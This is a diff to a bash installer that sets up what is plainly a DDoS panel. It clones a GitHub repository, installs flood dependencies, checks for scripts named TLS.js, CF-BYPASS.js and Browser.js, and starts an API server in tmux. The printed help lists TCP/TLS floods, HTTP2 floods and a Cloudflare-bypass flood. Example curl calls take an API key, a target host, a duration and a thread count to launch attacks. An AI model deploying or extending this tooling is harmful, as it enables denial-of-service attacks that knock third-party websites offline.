@@ -12,68 +12,53 @@ echo -e "${GREEN}              Version 3.0                ${NC}"
 echo -e "${GREEN}========================================${NC}"
 
 # ==================== UPDATE SYSTEM ====================
-echo -e "${YELLOW}[1/13] Updating system packages...${NC}"
+echo -e "${YELLOW}[1/12] Updating system packages...${NC}"
 apt update -y && apt upgrade -y
 
 # ==================== INSTALL DEPENDENCIES ====================
-echo -e "${YELLOW}[2/13] Installing Node.js and npm...${NC}"
+echo -e "${YELLOW}[2/12] Installing Node.js and npm...${NC}"
 apt install nodejs npm -y
 
-echo -e "${YELLOW}[3/13] Installing tmux...${NC}"
+echo -e "${YELLOW}[3/12] Installing tmux...${NC}"
 apt install tmux -y
 
-echo -e "${YELLOW}[4/13] Installing git...${NC}"
+echo -e "${YELLOW}[4/12] Installing git...${NC}"
 apt install git -y
 
-echo -e "${YELLOW}[5/13] Installing unrar...${NC}"
-apt install unrar -y
-
-echo -e "${YELLOW}[6/13] Installing wget and curl...${NC}"
+echo -e "${YELLOW}[5/12] Installing wget and curl...${NC}"
 apt install wget curl -y
 
 # ==================== CHECK NODE VERSION ====================
-echo -e "${YELLOW}[7/13] Checking Node.js version...${NC}"
+echo -e "${YELLOW}[6/12] Checking Node.js version...${NC}"
 NODE_VERSION=$(node -v)
 echo -e "${GREEN}Node.js version: ${NODE_VERSION}${NC}"
 
-# ==================== DOWNLOAD FROM GITHUB ====================
-echo -e "${YELLOW}[8/13] Downloading from GitHub...${NC}"
+# ==================== CLONE FROM GITHUB ====================
+echo -e "${YELLOW}[7/12] Cloning from GitHub...${NC}"
 
 # Backup existing directory
-if [ -d "archn-tool" ]; then
-    echo -e "${YELLOW}Directory archn-tool already exists, backing up...${NC}"
-    mv archn-tool archn-tool.bak.$(date +%s)
+if [ -d "this-is-a-hub-nah" ]; then
+    echo -e "${YELLOW}Directory this-is-a-hub-nah already exists, updating...${NC}"
+    cd this-is-a-hub-nah
+    git pull
+    cd ..
+else
+    echo -e "${YELLOW}Cloning repository...${NC}"
+    git clone https://github.com/raflyprasetya/this-is-a-hub-nah.git
 fi
 
-# Download RAR file from GitHub
-echo -e "${YELLOW}Downloading archn-tool.rar...${NC}"
-wget -O archn-tool.rar "https://github.com/tashijau059-hub/archn-tool/raw/refs/heads/main/scripts/archn-tool.rar" --no-check-certificate
-
-if [ ! -f "archn-tool.rar" ]; then
-    echo -e "${RED}Failed to download file from GitHub!${NC}"
+if [ ! -d "this-is-a-hub-nah" ]; then
+    echo -e "${RED}Failed to clone repository from GitHub!${NC}"
     exit 1
 fi
 
-echo -e "${GREEN}Download completed!${NC}"
-
-# ==================== EXTRACT RAR ====================
-echo -e "${YELLOW}[9/13] Extracting RAR file...${NC}"
-unrar x archn-tool.rar
-
-if [ ! -d "archn-tool" ]; then
-    echo -e "${RED}Failed to extract RAR file!${NC}"
-    echo -e "${YELLOW}Checking extracted contents...${NC}"
-    ls -la
-    exit 1
-fi
-
-echo -e "${GREEN}Extraction completed!${NC}"
+echo -e "${GREEN}Clone completed!${NC}"
 
 # ==================== NAVIGATE TO DIRECTORY ====================
-cd archn-tool
+cd this-is-a-hub-nah
 
 # ==================== CREATE SCRIPTS DIRECTORY ====================
-echo -e "${YELLOW}[10/13] Creating scripts directory...${NC}"
+echo -e "${YELLOW}[8/12] Creating scripts directory...${NC}"
 mkdir -p scripts
 
 # ==================== CLEAN NODE_MODULES (if exists) ====================
@@ -83,7 +68,7 @@ if [ -d "node_modules" ]; then
 fi
 
 # ==================== INSTALL NPM PACKAGES ====================
-echo -e "${YELLOW}[11/13] Installing npm dependencies...${NC}"
+echo -e "${YELLOW}[9/12] Installing npm dependencies...${NC}"
 
 # Install all required dependencies
 npm install express randomstring user-agents axios commander hpack request --silent
@@ -112,7 +97,7 @@ fi
 echo -e "${GREEN}NPM dependencies installed!${NC}"
 
 # ==================== CREATE DEFAULT FILES ====================
-echo -e "${YELLOW}Creating default configuration files...${NC}"
+echo -e "${YELLOW}[10/12] Creating default configuration files...${NC}"
 
 # Create empty proxy.txt if not exists
 if [ ! -f "scripts/proxy.txt" ]; then
@@ -197,77 +182,30 @@ fi
 if [ -f "scripts/TLS.js" ]; then
     echo -e "${GREEN}✓ scripts/TLS.js found${NC}"
 else
-    echo -e "${RED}✗ scripts/TLS.js not found!${NC}"
-    echo -e "${YELLOW}Creating placeholder...${NC}"
-    touch scripts/TLS.js
+    echo -e "${YELLOW}⚠ scripts/TLS.js not found (optional)${NC}"
 fi
 
 if [ -f "scripts/TLSV2.js" ]; then
     echo -e "${GREEN}✓ scripts/TLSV2.js found${NC}"
 else
-    echo -e "${RED}✗ scripts/TLSV2.js not found!${NC}"
-    echo -e "${YELLOW}Creating placeholder...${NC}"
-    touch scripts/TLSV2.js
+    echo -e "${YELLOW}⚠ scripts/TLSV2.js not found (optional)${NC}"
 fi
 
 if [ -f "scripts/CF-BYPASS.js" ]; then
     echo -e "${GREEN}✓ scripts/CF-BYPASS.js found${NC}"
 else
-    echo -e "${RED}✗ scripts/CF-BYPASS.js not found!${NC}"
-    echo -e "${YELLOW}Creating placeholder...${NC}"
-    touch scripts/CF-BYPASS.js
+    echo -e "${YELLOW}⚠ scripts/CF-BYPASS.js not found (optional)${NC}"
 fi
 
 if [ -f "scripts/Browser.js" ]; then
     echo -e "${GREEN}✓ scripts/Browser.js found${NC}"
 else
-    echo -e "${RED}✗ scripts/Browser.js not found!${NC}"
-    echo -e "${YELLOW}Creating placeholder...${NC}"
-    touch scripts/Browser.js
+    echo -e "${YELLOW}⚠ scripts/Browser.js not found (optional)${NC}"
 fi
-
-# ==================== CLEANUP ====================
-echo -e ""
-echo -e "${YELLOW}Cleaning up...${NC}"
-rm -f ../archn-tool.rar
-
-# ==================== TEST DEPENDENCIES ====================
-echo -e ""
-echo -e "${YELLOW}Testing dependencies...${NC}"
-node -e "
-try {
-    require('express');
-    console.log('✓ express loaded');
-} catch(e) { console.log('✗ express failed:', e.message); }
-try {
-    require('randomstring');
-    console.log('✓ randomstring loaded');
-} catch(e) { console.log('✗ randomstring failed:', e.message); }
-try {
-    require('user-agents');
-    console.log('✓ user-agents loaded');
-} catch(e) { console.log('✗ user-agents failed:', e.message); }
-try {
-    require('axios');
-    console.log('✓ axios loaded');
-} catch(e) { console.log('✗ axios failed:', e.message); }
-try {
-    require('commander');
-    console.log('✓ commander loaded');
-} catch(e) { console.log('✗ commander failed:', e.message); }
-try {
-    require('hpack');
-    console.log('✓ hpack loaded');
-} catch(e) { console.log('✗ hpack failed:', e.message); }
-try {
-    require('request');
-    console.log('✓ request loaded');
-} catch(e) { console.log('✗ request failed:', e.message); }
-"
 
 # ==================== START SERVER WITH TMUX ====================
 echo -e ""
-echo -e "${YELLOW}Starting server with tmux...${NC}"
+echo -e "${YELLOW}[11/12] Starting server with tmux...${NC}"
 
 # Kill existing tmux session if any
 tmux kill-session -t rf47 2>/dev/null
@@ -301,7 +239,7 @@ echo -e "  ${GREEN}● tls${NC}     - TCP/TLS Flood via HTTP/HTTPS/SOCKS proxy"
 echo -e "  ${GREEN}● tlsv2${NC}   - HTTP2 Flood with stable auto-reconnect"
 echo -e "  ${GREEN}● cf${NC}      - Cloudflare Bypass HTTP2 Flood"
 echo -e "  ${GREEN}● fast${NC}    - H2-FAST Advanced HTTP2 Flood with AI Fingerprint"
-echo -e "  ${GREEN}● browser${NC} - Browser Engine - Real browser simulation with challenge solver"
+echo -e "  ${GREEN}● browser${NC} - Browser Engine - Real browser simulation"
 echo -e ""
 echo -e "${BLUE}Commands:${NC}"
 echo -e "  ${YELLOW}tmux attach -t rf47${NC}       - Attach to server session"
@@ -320,13 +258,10 @@ echo -e ""
 echo -e "  ${YELLOW}# CF Method${NC}"
 echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=cf&port=443&time=30&threads=10\""
 echo -e ""
-echo -e "  ${YELLOW}# FAST Method (H2-FAST)${NC}"
+echo -e "  ${YELLOW}# FAST Method${NC}"
 echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=fast&port=443&time=30&threads=10&rate=100&connections=10&streams=10&fingerprint=true&extra=true\""
 echo -e ""
 echo -e "  ${YELLOW}# BROWSER Method${NC}"
 echo -e "  curl \"http://localhost:3000/api?api_key=rfpromax1337&ip=example.com&method=browser&port=443&time=30&threads=10&browser_count=5&conn_timeout=30000&rps=10\""
-echo -e ""
-echo -e "${GREEN}Health Check:${NC}"
-echo -e "  curl \"http://localhost:3000/health\""
 echo -e ""
 echo -e "${GREEN}========================================${NC}"
